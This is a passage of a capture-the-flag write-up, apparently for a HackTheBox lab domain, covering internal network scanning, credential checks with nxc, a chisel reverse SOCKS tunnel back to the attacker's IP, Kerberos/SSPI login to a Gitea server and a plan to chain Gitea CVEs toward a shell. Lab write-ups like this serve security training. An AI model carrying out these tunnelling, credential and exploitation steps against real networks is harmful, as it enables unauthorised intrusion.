| L4IRREMwMi5kYXJremVyby5leHSCDGRhcmt6ZXJvLmV4dIIMZGFya3plcm8tZXh0
| ME8GCSsGAQQBgjcZAgRCMECgPgYKKwYBBAGCNxkCAaAwBC5TLTEtNS0yMS0yODUw
| NzgzNzU4LTEyMzEyNDQ2NTgtMjA1MTg1NzUyOS0xMDAwMA0GCSqGSIb3DQEBCwUA
| A4ICAQCIPmxCJV8UzSiPdev2pepckCtCiJJ+TVM34OgctdDcIhxRFTQsVYy/NUwt
| zmFVCk0LF4Y6RjdHoWA5psfJvokIbNWreTX5fh+ILUZFoj5TqrulxUFHRX1qUV6R
| po/e1kzcPQytvmGO+Xvbk5TP0IdnGx4y0EPA3bhCNjrSl6mLVCz+NbEP7iSI12y6
| gyJyeAoe2cGCHvDJZcvuZkGnEF8Puuo6cUAYFrcAsugrAo5ErVlO03utb8m3nv/i
| exHLDgrXO2O/ogryWV0SluB9dW8juQplA+PV8SLPSmCrH60KhujsT4tmjNC0hUCR
| AlwUax6C2XSlFKYdDKNeuK5bfhYg3Ep9bOgC6Pk5vDaCUlK7aEmQgpxSZrzCx3AU
| tIEbvBi94DbVSElqzCsmHNh25HPO63lqGRNM1xTF77jDVMYwB6m7MCUM1zOQ4r6K
| wt2kyjWcKiolQWMHls++tv6AFBIdT0XQJGHUEZuXZYAyLw1UDpQaOMti/rHNU1gE
| 2xu55SvNd04SmjMiKXBVTLfflPmr0cGveQipd9LoRqVzU4UiMi+F/4xmX+LPHRmh
| LJMMxjGoT/IPuxFSY2F547C+yvi6WNuP04FcChgT1BbHqwr+avAn7NFnx/FZBRgz
| D5DrluDUkGZfR0XCjzbPTvmUmJOk1ffucIn0zcf/KFN2SxlrJw==
|_-----END CERTIFICATE-----
5985/tcp open  http          syn-ack ttl 64 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.99%I=7%D=7/31%Time=6A6CAE4A%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
SF:20Request")%r(GetRequest,3765,"HTTP/1\.0\x20200\x20OK\r\nCache-Control:
SF:\x20max-age=0,\x20private,\x20must-revalidate,\x20no-transform\r\nConte
SF:nt-Type:\x20text/html;\x20charset=utf-8\r\nSet-Cookie:\x20i_like_gitea=
SF:55fbb058fd817a2a;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nSet-Cookie
SF::\x20_csrf=8uxnW_lYGOAouMnpZ9_vUfG6E5E6MTc4NTUzMjYwMjM4NjY1NDEwMA;\x20P
SF:ath=/;\x20Max-Age=86400;\x20HttpOnly;\x20SameSite=Lax\r\nX-Frame-Option
SF:s:\x20SAMEORIGIN\r\nDate:\x20Fri,\x2031\x20Jul\x202026\x2021:16:42\x20G
SF:MT\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en-US\"\x20data-theme=\"g
SF:itea-auto\">\n<head>\n\t<meta\x20name=\"viewport\"\x20content=\"width=d
SF:evice-width,\x20initial-scale=1\">\n\t<title>Gitea:\x20Git\x20with\x20a
SF:\x20cup\x20of\x20tea</title>\n\t<link\x20rel=\"manifest\"\x20href=\"dat
SF:a:application/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mI
SF:HRlYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3Rh
SF:cnRfdXJsIjoiaHR0cDovL2dpdGVhLmRhcmt6ZXJvLmV4dDozMDAwLyIsImljb25zIjpbeyJ
SF:zcmMiOiJodHRwOi8vZ2l0ZWEuZGFya3plcm8uZXh0OjMwMDAvYXNzZXRzL2ltZy9sb2dvLn
SF:BuZyIsInR5cGUiOi")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nCon
SF:tent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\
SF:r\n400\x20Bad\x20Request")%r(HTTPOptions,197,"HTTP/1\.0\x20405\x20Metho
SF:d\x20Not\x20Allowed\r\nAllow:\x20HEAD\r\nAllow:\x20GET\r\nCache-Control
SF::\x20max-age=0,\x20private,\x20must-revalidate,\x20no-transform\r\nSet-
SF:Cookie:\x20i_like_gitea=f0625eb29d599d1b;\x20Path=/;\x20HttpOnly;\x20Sa
SF:meSite=Lax\r\nSet-Cookie:\x20_csrf=T-ElSfA6WOO4Nnyxr86EKsOCMhA6MTc4NTUz
SF:MjYwMjUzNDYwODAwMA;\x20Path=/;\x20Max-Age=86400;\x20HttpOnly;\x20SameSi
SF:te=Lax\r\nX-Frame-Options:\x20SAMEORIGIN\r\nDate:\x20Fri,\x2031\x20Jul\
SF:x202026\x2021:16:42\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(RTSPRequ
SF:est,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/pla
SF:in;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Reque
SF:st");
Service Info: Host: DC02; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| nbstat: NetBIOS name: DC02, NetBIOS user: <unknown>, NetBIOS MAC: 00:15:5d:f4:7c:01 (Microsoft)
| Names:
|   DC02<00>             Flags: <unique><active>
|   DARKZERO-EXT<00>     Flags: <group><active>
|   DARKZERO-EXT<1c>     Flags: <group><active>
|   DC02<20>             Flags: <unique><active>
|   DARKZERO-EXT<1b>     Flags: <unique><active>
| Statistics:
|   00 15 5d f4 7c 01 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
| smb2-time: 
|   date: 2026-07-31T21:17:38
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 61060/tcp): CLEAN (Timeout)
|   Check 2 (port 55889/tcp): CLEAN (Timeout)
|   Check 3 (port 44875/udp): CLEAN (Timeout)
|   Check 4 (port 15661/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: 6h59m58s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

Nmap scan report for 172.16.20.3
Host is up, received echo-reply ttl 64 (0.035s latency).
Scanned at 2026-07-31 10:14:35 EDT for 217s
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 9.6p1 Ubuntu 3ubuntu13.18 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBN9Ju3bTZsFozwXY1B2KIlEY4BA+RcNM57w4C5EjOw1QegUUyCJoO4TVOKfzy/9kd3WrPEj/FYKT2agja9/PM44=
|   256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH9qI0OvMyp03dAGXR0UPdxw7hjSwMR773Yb9Sne+7vD
80/tcp open  http    syn-ack ttl 64 nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://dzcampaigns.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- we have all the info here but we can also use nxc to generate the details to add to our `/etc/hosts`:
```
nxc smb 172.16.20.0/24 --generate-hosts-file hosts
SMB         172.16.20.2     445    DC02             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC02) (domain:darkzero.ext) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         172.16.20.1     445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:darkzero.htb) (signing:True) (SMBv1:None) (Null Auth:True)
Running nxc against 256 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
                                                                                                                                                                                                                                                             
┌──(kali㉿kali)-[/tmp/pwn_repo]
└─$ cat hosts                                
172.16.20.1     DC01.darkzero.htb darkzero.htb DC01
172.16.20.2     DC02.darkzero.ext darkzero.ext DC02
```
![[Pasted image 20260731102733.png]]

- On DC02 we see a http server running on port 3000 and we access it on the browser to find gitea being hosted:
![[Pasted image 20260731102237.png]]

- Unfortunately we are not able to sign in with josh's user. However we see an SSPI login method.
![[Pasted image 20260731102757.png]]

- I check if josh has a valid account in DC02:
```
nxc smb 172.16.20.0/24 -u josh -p 'Rangers1'

---OUTPUT---
SMB         172.16.20.2     445    DC02             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC02) (domain:darkzero.ext) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         172.16.20.1     445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:darkzero.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         172.16.20.2     445    DC02             [+] darkzero.ext\josh:Rangers1 (Pwn3d!)
SMB         172.16.20.1     445    DC01             [-] Connection Error: The NETBIOS connection with the remote host timed out.
Running nxc against 256 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
```
![[Pasted image 20260731102950.png]]

- we also add the gitea website to `/etc/hosts`:
```
echo "172.16.20.2 gitea.darkzero.ext" | tee -a /etc/hosts
```

- However SSPI fails with ligolo probably due to how it handles DNS resolution; in a way that prevents reverse canonicalization – it may forward DNS queries differently, or it may not support the same SOCKS5 remote‑DNS behavior that chisel + proxychains provides
![[Pasted image 20260731104054.png]]

- So i remove this tunnel and create a chisel tunnel instead:
```
# ON KALI
chisel server --reverse --port 8888

# ON TARGET 
nohup ./chisel client 10.10.16.41:8888 R:socks > /dev/null 2>&1 &
```

- I also edit my krbconf file as we are going to use kerberos authentication for SSPI:
```
cat /etc/krb5.conf 

---OUTPUT---
[libdefaults]
default_realm = DARKZERO.EXT
dns_lookup_realm = false
dns_lookup_kdc = false
rdns = false
udp_preference_limit = 1
forwardable = true

[realms]
DARKZERO.EXT = {
    kdc = dc02.darkzero.ext
}
DARKZERO.HTB = {
    kdc = dc01.darkzero.htb
}

[domain_realm]
.darkzero.ext = DARKZERO.EXT
.darkzero.htb = DARKZERO.HTB
```

- I create a kerberos ccache for the user josh:
```
user='josh'
pass='Rangers1'            
echo $pass | KRB5CCNAME=/tmp/krb5cc_josh proxychains4 -q faketime '+7 hours' kinit $user@DARKZERO.EXT

echo $pass | KRB5CCNAME=/tmp/krb5cc_josh proxychains4 -q faketime '+7 hours' kinit  $user@DARKZERO.EXT > /dev/null

export KRB5CCNAME=/tmp/krb5cc_josh
```

- I confirm we can connect with a curl command:
```
faketime '+7 hours' proxychains4 -q curl --negotiate -u : \
 http://gitea.darkzero.ext:3000/api/v1/user/repos | python3 -m json.tool
 
 --OUTPUT---
 http://gitea.darkzero.ext:3000/api/v1/user/repos | python3 -m json.tool
  % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
                                 Dload  Upload  Total   Spent   Left   Speed
100  14559   0  14559   0      0  59794      0                              0
[
    {
        "id": 2,
        "owner": {
            "id": 2,
            "login": "DarkZero",
            "login_name": "",
            "source_id": 0,
            "full_name": "",
            "email": "darkzero@noreply.gitea.darkzero.ext",
            "avatar_url": "http://gitea.darkzero.ext:3000/avatars/6ff3a709898c448269322001d983c279",
            "html_url": "http://gitea.darkzero.ext:3000/DarkZero",
            "language": "",
            "is_admin": false,
            "last_login": "0001-01-01T00:00:00Z",
            "created": "2026-05-20T13:38:40-07:00",
            "restricted": false,
            "active": false,
            "prohibit_login": false,
            "location": "",
            "website": "",
            "description": "",
            "visibility": "private",
            "followers_count": 0,
            "following_count": 0,
            "starred_repos_count": 0,
            "username": "DarkZero"
        },
        "name": "DarkZero-Campaigns",
        "full_name": "DarkZero/DarkZero-Campaigns",
        "description": "Dev repository for DarkZero Campaigns",
        "empty": false,
        "private": true,
        "fork": false,
        "template": false,
        "mirror": false,
        "size": 3249,
        "language": "JavaScript",
        "languages_url": "http://gitea.darkzero.ext:3000/api/v1/repos/DarkZero/DarkZero-Campaigns/languages",
        "html_url": "http://gitea.darkzero.ext:3000/DarkZero/DarkZero-Campaigns",
        "url": "http://gitea.darkzero.ext:3000/api/v1/repos/DarkZero/DarkZero-Campaigns",
        "link": "",
        "ssh_url": "svc-gitea@gitea.darkzero.ext:DarkZero/DarkZero-Campaigns.git",
        "clone_url": "http://gitea.darkzero.ext:3000/DarkZero/DarkZero-Campaigns.git",
        "original_url": "",
        "website": "http://dzcampaigns.htb/",
        "stars_count": 0,
        "forks_count": 1,
        "watchers_count": 6,
        "open_issues_count": 0,
        "open_pr_counter": 1,
        "release_counter": 0,
        "default_branch": "main",
        "archived": false,
        "created_at": "2026-05-20T13:48:11-07:00",
        "updated_at": "2026-05-20T14:01:40-07:00",
        "archived_at": "1969-12-31T16:00:00-08:00",
        "permissions": {
            "admin": false,
            "push": false,
            "pull": true
        },
        "has_code": false,
        "has_issues": true,
        "internal_tracker": {
            "enable_time_tracker": true,
            "allow_only_contributors_to_track_time": true,
            "enable_issue_dependencies": true
        },
        "has_wiki": true,
        "has_pull_requests": true,
        "has_projects": true,
        "projects_mode": "all",
        "has_releases": true,
        "has_packages": true,
        "has_actions": true,
        "ignore_whitespace_conflicts": false,
        "allow_merge_commits": true,
        "allow_rebase": true,
        "allow_rebase_explicit": true,
        "allow_squash_merge": true,
        "allow_fast_forward_only_merge": true,
        "allow_rebase_update": true,
        "allow_manual_merge": false,
        "autodetect_manual_merge": false,
        "default_delete_branch_after_merge": false,
        "default_merge_style": "merge",
        "default_allow_maintainer_edit": false,
        "avatar_url": "",
        "internal": false,
        "mirror_interval": "",
        "object_format_name": "sha1",
        "mirror_updated": "0001-01-01T00:00:00Z",
        "topics": [],
        "licenses": []
    },
    {
        "id": 3,
        "owner": {
            "id": 6,
            "login": "darkzero-ext_josh",
            "login_name": "",
            "source_id": 0,
            "full_name": "",
            "email": "darkzero-ext_josh@noreply.gitea.darkzero.ext",
            "avatar_url": "http://gitea.darkzero.ext:3000/avatars/5f3a440ab8b9ef02507361310493654d",
            "html_url": "http://gitea.darkzero.ext:3000/darkzero-ext_josh",
            "language": "",
            "is_admin": false,
            "last_login": "0001-01-01T00:00:00Z",
            "created": "2026-05-20T13:44:57-07:00",
            "restricted": false,
            "active": false,
            "prohibit_login": false,
            "location": "",
            "website": "",
            "description": "",
            "visibility": "public",
            "followers_count": 0,
            "following_count": 0,
            "starred_repos_count": 0,
            "username": "darkzero-ext_josh"
        },
        "name": "DarkZero-Campaigns",
        "full_name": "darkzero-ext_josh/DarkZero-Campaigns",
        "description": "Dev repository for DarkZero Campaigns",
        "empty": false,
        "private": true,
        "fork": true,
        "template": false,
        "parent": {
            "id": 2,
            "owner": {
                "id": 2,
                "login": "DarkZero",
                "login_name": "",
                "source_id": 0,
                "full_name": "",
                "email": "",
                "avatar_url": "http://gitea.darkzero.ext:3000/avatars/6ff3a709898c448269322001d983c279",
                "html_url": "http://gitea.darkzero.ext:3000/DarkZero",
                "language": "",
                "is_admin": false,
                "last_login": "0001-01-01T00:00:00Z",
                "created": "2026-05-20T13:38:40-07:00",
                "restricted": false,
                "active": false,
                "prohibit_login": false,
                "location": "",
                "website": "",
                "description": "",
                "visibility": "private",
                "followers_count": 0,
                "following_count": 0,
                "starred_repos_count": 0,
                "username": "DarkZero"
            },
            "name": "DarkZero-Campaigns",
            "full_name": "DarkZero/DarkZero-Campaigns",
            "description": "Dev repository for DarkZero Campaigns",
            "empty": false,
            "private": true,
            "fork": false,
            "template": false,
            "mirror": false,
            "size": 3249,
            "language": "",
            "languages_url": "http://gitea.darkzero.ext:3000/api/v1/repos/DarkZero/DarkZero-Campaigns/languages",
            "html_url": "http://gitea.darkzero.ext:3000/DarkZero/DarkZero-Campaigns",
            "url": "http://gitea.darkzero.ext:3000/api/v1/repos/DarkZero/DarkZero-Campaigns",
            "link": "",
            "ssh_url": "svc-gitea@gitea.darkzero.ext:DarkZero/DarkZero-Campaigns.git",
            "clone_url": "http://gitea.darkzero.ext:3000/DarkZero/DarkZero-Campaigns.git",
            "original_url": "",
            "website": "http://dzcampaigns.htb/",
            "stars_count": 0,
            "forks_count": 1,
            "watchers_count": 6,
            "open_issues_count": 0,
            "open_pr_counter": 1,
            "release_counter": 0,
            "default_branch": "main",
            "archived": false,
            "created_at": "2026-05-20T13:48:11-07:00",
            "updated_at": "2026-05-20T14:01:40-07:00",
            "archived_at": "1969-12-31T16:00:00-08:00",
            "permissions": {
                "admin": true,
                "push": true,
                "pull": true
            },
            "has_code": false,
            "has_issues": true,
            "internal_tracker": {
                "enable_time_tracker": true,
                "allow_only_contributors_to_track_time": true,
                "enable_issue_dependencies": true
            },
            "has_wiki": true,
            "has_pull_requests": true,
            "has_projects": true,
            "projects_mode": "all",
            "has_releases": true,
            "has_packages": true,
            "has_actions": true,
            "ignore_whitespace_conflicts": false,
            "allow_merge_commits": true,
            "allow_rebase": true,
            "allow_rebase_explicit": true,
            "allow_squash_merge": true,
            "allow_fast_forward_only_merge": true,
            "allow_rebase_update": true,
            "allow_manual_merge": false,
            "autodetect_manual_merge": false,
            "default_delete_branch_after_merge": false,
            "default_merge_style": "merge",
            "default_allow_maintainer_edit": false,
            "avatar_url": "",
            "internal": false,
            "mirror_interval": "",
            "object_format_name": "sha1",
            "mirror_updated": "0001-01-01T00:00:00Z",
            "topics": [],
            "licenses": []
        },
        "mirror": false,
        "size": 3253,
        "language": "JavaScript",
        "languages_url": "http://gitea.darkzero.ext:3000/api/v1/repos/darkzero-ext_josh/DarkZero-Campaigns/languages",
        "html_url": "http://gitea.darkzero.ext:3000/darkzero-ext_josh/DarkZero-Campaigns",
        "url": "http://gitea.darkzero.ext:3000/api/v1/repos/darkzero-ext_josh/DarkZero-Campaigns",
        "link": "",
        "ssh_url": "svc-gitea@gitea.darkzero.ext:darkzero-ext_josh/DarkZero-Campaigns.git",
        "clone_url": "http://gitea.darkzero.ext:3000/darkzero-ext_josh/DarkZero-Campaigns.git",
        "original_url": "",
        "website": "",
        "stars_count": 0,
        "forks_count": 0,
        "watchers_count": 1,
        "open_issues_count": 0,
        "open_pr_counter": 0,
        "release_counter": 0,
        "default_branch": "main",
        "archived": false,
        "created_at": "2026-07-31T08:35:25-07:00",
        "updated_at": "2026-07-31T08:40:38-07:00",
        "archived_at": "1969-12-31T16:00:00-08:00",
        "permissions": {
            "admin": true,
            "push": true,
            "pull": true
        },
        "has_code": false,
        "has_issues": false,
        "has_wiki": false,
        "has_pull_requests": true,
        "has_projects": false,
        "projects_mode": "all",
        "has_releases": false,
        "has_packages": false,
        "has_actions": true,
        "ignore_whitespace_conflicts": false,
        "allow_merge_commits": true,
        "allow_rebase": true,
        "allow_rebase_explicit": true,
        "allow_squash_merge": true,
        "allow_fast_forward_only_merge": true,
        "allow_rebase_update": true,
        "allow_manual_merge": false,
        "autodetect_manual_merge": false,
        "default_delete_branch_after_merge": false,
        "default_merge_style": "merge",
        "default_allow_maintainer_edit": true,
        "avatar_url": "",
        "internal": false,
        "mirror_interval": "",
        "object_format_name": "sha1",
        "mirror_updated": "0001-01-01T00:00:00Z",
        "topics": [],
        "licenses": []
    },
    {
        "id": 4,
        "owner": {
            "id": 6,
            "login": "darkzero-ext_josh",
            "login_name": "",
            "source_id": 0,
            "full_name": "",
            "email": "darkzero-ext_josh@noreply.gitea.darkzero.ext",
            "avatar_url": "http://gitea.darkzero.ext:3000/avatars/5f3a440ab8b9ef02507361310493654d",
            "html_url": "http://gitea.darkzero.ext:3000/darkzero-ext_josh",
            "language": "",
            "is_admin": false,
            "last_login": "0001-01-01T00:00:00Z",
            "created": "2026-05-20T13:44:57-07:00",
            "restricted": false,
            "active": false,
            "prohibit_login": false,
            "location": "",
            "website": "",
            "description": "",
            "visibility": "public",
            "followers_count": 0,
            "following_count": 0,
            "starred_repos_count": 0,
            "username": "darkzero-ext_josh"
        },
        "name": "pwn_template",
        "full_name": "darkzero-ext_josh/pwn_template",
        "description": "template repo",
        "empty": false,
        "private": false,
        "fork": false,
        "template": true,
        "mirror": false,
        "size": 31,
        "language": "Text",
        "languages_url": "http://gitea.darkzero.ext:3000/api/v1/repos/darkzero-ext_josh/pwn_template/languages",
        "html_url": "http://gitea.darkzero.ext:3000/darkzero-ext_josh/pwn_template",
        "url": "http://gitea.darkzero.ext:3000/api/v1/repos/darkzero-ext_josh/pwn_template",
        "link": "",
        "ssh_url": "svc-gitea@gitea.darkzero.ext:darkzero-ext_josh/pwn_template.git",
        "clone_url": "http://gitea.darkzero.ext:3000/darkzero-ext_josh/pwn_template.git",
        "original_url": "",
        "website": "",
        "stars_count": 0,
        "forks_count": 0,
        "watchers_count": 1,
        "open_issues_count": 0,
        "open_pr_counter": 0,
        "release_counter": 0,
        "default_branch": "master",
        "archived": false,
        "created_at": "2026-07-31T08:48:17-07:00",
        "updated_at": "2026-07-31T08:49:05-07:00",
        "archived_at": "1969-12-31T16:00:00-08:00",
        "permissions": {
            "admin": true,
            "push": true,
            "pull": true
        },
        "has_code": false,
        "has_issues": true,
        "internal_tracker": {
            "enable_time_tracker": true,
            "allow_only_contributors_to_track_time": true,
            "enable_issue_dependencies": true
        },
        "has_wiki": true,
        "has_pull_requests": true,
        "has_projects": true,
        "projects_mode": "all",
        "has_releases": true,
        "has_packages": true,
        "has_actions": false,
        "ignore_whitespace_conflicts": false,
        "allow_merge_commits": true,
        "allow_rebase": true,
        "allow_rebase_explicit": true,
        "allow_squash_merge": true,
        "allow_fast_forward_only_merge": true,
        "allow_rebase_update": true,
        "allow_manual_merge": false,
        "autodetect_manual_merge": false,
        "default_delete_branch_after_merge": false,
        "default_merge_style": "merge",
        "default_allow_maintainer_edit": false,
        "avatar_url": "",
        "internal": false,
        "mirror_interval": "",
        "object_format_name": "sha1",
        "mirror_updated": "0001-01-01T00:00:00Z",
        "topics": [],
        "licenses": []
    },
    {
        "id": 5,
        "owner": {
            "id": 6,
            "login": "darkzero-ext_josh",
            "login_name": "",
            "source_id": 0,
            "full_name": "",
            "email": "darkzero-ext_josh@noreply.gitea.darkzero.ext",
            "avatar_url": "http://gitea.darkzero.ext:3000/avatars/5f3a440ab8b9ef02507361310493654d",
            "html_url": "http://gitea.darkzero.ext:3000/darkzero-ext_josh",
            "language": "",
            "is_admin": false,
            "last_login": "0001-01-01T00:00:00Z",
            "created": "2026-05-20T13:44:57-07:00",
            "restricted": false,
            "active": false,
            "prohibit_login": false,
            "location": "",
            "website": "",
            "description": "",
            "visibility": "public",
            "followers_count": 0,
            "following_count": 0,
            "starred_repos_count": 0,
            "username": "darkzero-ext_josh"
        },
        "name": "triggered_repo",
        "full_name": "darkzero-ext_josh/triggered_repo",
        "description": ".git.",
        "empty": false,
        "private": false,
        "fork": false,
        "template": false,
        "mirror": false,
        "size": 0,
        "language": "",
        "languages_url": "http://gitea.darkzero.ext:3000/api/v1/repos/darkzero-ext_josh/triggered_repo/languages",
        "html_url": "http://gitea.darkzero.ext:3000/darkzero-ext_josh/triggered_repo",
        "url": "http://gitea.darkzero.ext:3000/api/v1/repos/darkzero-ext_josh/triggered_repo",
        "link": "",
        "ssh_url": "svc-gitea@gitea.darkzero.ext:darkzero-ext_josh/triggered_repo.git",
        "clone_url": "http://gitea.darkzero.ext:3000/darkzero-ext_josh/triggered_repo.git",
        "original_url": "",
        "website": "",
        "stars_count": 0,
        "forks_count": 0,
        "watchers_count": 1,
        "open_issues_count": 0,
        "open_pr_counter": 0,
        "release_counter": 0,
        "default_branch": "",
        "archived": false,
        "created_at": "2026-07-31T08:49:26-07:00",
        "updated_at": "2026-07-31T08:49:26-07:00",
        "archived_at": "1969-12-31T16:00:00-08:00",
        "permissions": {
            "admin": true,
            "push": true,
            "pull": true
        },
        "has_code": false,
        "has_issues": true,
        "internal_tracker": {
            "enable_time_tracker": true,
            "allow_only_contributors_to_track_time": true,
            "enable_issue_dependencies": true
        },
        "has_wiki": true,
        "has_pull_requests": true,
        "has_projects": true,
        "projects_mode": "all",
        "has_releases": true,
        "has_packages": true,
        "has_actions": false,
        "ignore_whitespace_conflicts": false,
        "allow_merge_commits": true,
        "allow_rebase": true,
        "allow_rebase_explicit": true,
        "allow_squash_merge": true,
        "allow_fast_forward_only_merge": true,
        "allow_rebase_update": true,
        "allow_manual_merge": false,
        "autodetect_manual_merge": false,
        "default_delete_branch_after_merge": false,
        "default_merge_style": "merge",
        "default_allow_maintainer_edit": false,
        "avatar_url": "",
        "internal": false,
        "mirror_interval": "",
        "object_format_name": "sha1",
        "mirror_updated": "0001-01-01T00:00:00Z",
        "topics": [],
        "licenses": []
    },
    {
        "id": 6,
        "owner": {
            "id": 6,
            "login": "darkzero-ext_josh",
            "login_name": "",
            "source_id": 0,
            "full_name": "",
            "email": "darkzero-ext_josh@noreply.gitea.darkzero.ext",
            "avatar_url": "http://gitea.darkzero.ext:3000/avatars/5f3a440ab8b9ef02507361310493654d",
            "html_url": "http://gitea.darkzero.ext:3000/darkzero-ext_josh",
            "language": "",
            "is_admin": false,
            "last_login": "0001-01-01T00:00:00Z",
            "created": "2026-05-20T13:44:57-07:00",
            "restricted": false,
            "active": false,
            "prohibit_login": false,
            "location": "",
            "website": "",
            "description": "",
            "visibility": "public",
            "followers_count": 0,
            "following_count": 0,
            "starred_repos_count": 0,
            "username": "darkzero-ext_josh"
        },
        "name": "triggered_repo2",
        "full_name": "darkzero-ext_josh/triggered_repo2",
        "description": ".git.",
        "empty": false,
        "private": false,
        "fork": false,
        "template": false,
        "mirror": false,
        "size": 0,
        "language": "",
        "languages_url": "http://gitea.darkzero.ext:3000/api/v1/repos/darkzero-ext_josh/triggered_repo2/languages",
        "html_url": "http://gitea.darkzero.ext:3000/darkzero-ext_josh/triggered_repo2",
        "url": "http://gitea.darkzero.ext:3000/api/v1/repos/darkzero-ext_josh/triggered_repo2",
        "link": "",
        "ssh_url": "svc-gitea@gitea.darkzero.ext:darkzero-ext_josh/triggered_repo2.git",
        "clone_url": "http://gitea.darkzero.ext:3000/darkzero-ext_josh/triggered_repo2.git",
        "original_url": "",
        "website": "",
        "stars_count": 0,
        "forks_count": 0,
        "watchers_count": 1,
        "open_issues_count": 0,
        "open_pr_counter": 0,
        "release_counter": 0,
        "default_branch": "",
        "archived": false,
        "created_at": "2026-07-31T10:43:30-07:00",
        "updated_at": "2026-07-31T10:43:30-07:00",
        "archived_at": "1969-12-31T16:00:00-08:00",
        "permissions": {
            "admin": true,
            "push": true,
            "pull": true
        },
        "has_code": false,
        "has_issues": true,
        "internal_tracker": {
            "enable_time_tracker": true,
            "allow_only_contributors_to_track_time": true,
            "enable_issue_dependencies": true
        },
        "has_wiki": true,
        "has_pull_requests": true,
        "has_projects": true,
        "projects_mode": "all",
        "has_releases": true,
        "has_packages": true,
        "has_actions": false,
        "ignore_whitespace_conflicts": false,
        "allow_merge_commits": true,
        "allow_rebase": true,
        "allow_rebase_explicit": true,
        "allow_squash_merge": true,
        "allow_fast_forward_only_merge": true,
        "allow_rebase_update": true,
        "allow_manual_merge": false,
        "autodetect_manual_merge": false,
        "default_delete_branch_after_merge": false,
        "default_merge_style": "merge",
        "default_allow_maintainer_edit": false,
        "avatar_url": "",
        "internal": false,
        "mirror_interval": "",
        "object_format_name": "sha1",
        "mirror_updated": "0001-01-01T00:00:00Z",
        "topics": [],
        "licenses": []
    }
]
```

- Initially i tried doing everything with curl but i fail to do a lot.

- Instead I grab cookies with ym curl request :
```
faketime '+7 hours' proxychains4 -q curl --negotiate -u : \
  -c cookies.txt -b cookies.txt \
  "http://gitea.darkzero.ext:3000/user/login?auth_with_sspi=1" \
  -L -v
```

- Then I read the cookies and copy the csrf token and i_like_gitea token to the browser:
```
cat cookies.txt

---OUTPUT---
# Netscape HTTP Cookie File
# https://curl.se/docs/http-cookies.html
# This file was generated by libcurl! Edit at your own risk.

#HttpOnly_gitea.darkzero.ext    FALSE   /       FALSE   1785548914      _csrf   SA8iQBTIfLpol7va4GnMe7GjCKY6MTc4NTQ2MjUxMzIyMjU1ODQwMA
#HttpOnly_gitea.darkzero.ext    FALSE   /       FALSE   0       i_like_gitea    b1a853645fa456c7
#HttpOnly_gitea.darkzero.ext    FALSE   /       FALSE   0       lang    en-US
```

![[Pasted image 20260731103800.png]]
- Note make sure you are using the socks proxy in the firewall network settings
- On a refresh I gain access to `darkzero-ext_josh` user
![[Pasted image 20260731104138.png]]
- I also see the gitea version on the bottom : `1.25.0`:
![[Pasted image 20260731104431.png]]

- Looking online I see the CVE CVE-2025-22555 which allows a user with onyl read permissions to be able to fork a repository purely because they are part of the organization and doesnt check its permissions (to create a repo or fork).
	- I googled `gitea <1.26.0 vulnerbailities CVE` and found a few including the above
- Furthermore i searched `gitea <1.26.0 vulnerability run fork` to find another CVE CVE-2026-58424 which `allows unauthorized users to bypass the approval process for pull requests, which could lead to unreviewed and potentially harmful code being merged into the main codebase`
- These two vulnerabilities mixed with a possible account running the merged code could lead to a shell.

- On the browser I first fork the repository.
![[Pasted image 20260731105113.png]]

- I then edit the settings to allow repository actions as well as maintainer edits
![[Pasted image 20260731105412.png]]
